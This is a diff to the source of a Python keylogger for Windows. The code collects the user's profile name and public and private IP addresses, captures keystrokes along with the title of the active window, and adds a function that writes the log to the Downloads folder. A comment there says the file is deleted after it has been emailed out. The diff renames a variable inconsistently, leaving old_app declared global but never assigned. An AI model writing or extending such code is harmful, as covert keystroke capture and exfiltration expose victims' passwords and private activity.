@@ -10,15 +10,16 @@ user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
 
-msg = f'[START OF LOGS]\n  *~ Date/Time: {absoluteTime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+log = f'[START OF LOGS]\n  *~ Date/Time: {absoluteTime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
 displayData = []
-displayData.append(msg)
+displayData.append(log)
 
 currentApp = ''
+toDeleteFile = []
 
 
 def on_press(key):
-    global currentApp
+    global old_app
 
     nextApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
@@ -27,7 +28,7 @@ def on_press(key):
     else:
         pass
 
-    if nextApp != currentApp and nextApp != '':
+    if nextApp != old_app and nextApp != '':
         displayData.append(f'[{absoluteTime}] ~ {nextApp}\n')
         currentApp = nextApp
     else:
@@ -46,3 +47,8 @@ def on_press(key):
     else:
         displayData.append(key)
 
+def write_file(count):
+    savingLocation = os.path.expanduser('~') + '/Downloads/' #Choosing the destination where we want the .txt file to be written
+    fileName = 'log.txt'
+    file = savingLocation + fileName
+    toDeleteFile.append(file)                                #Saving the file so that we can delete it once we've emailed ourself
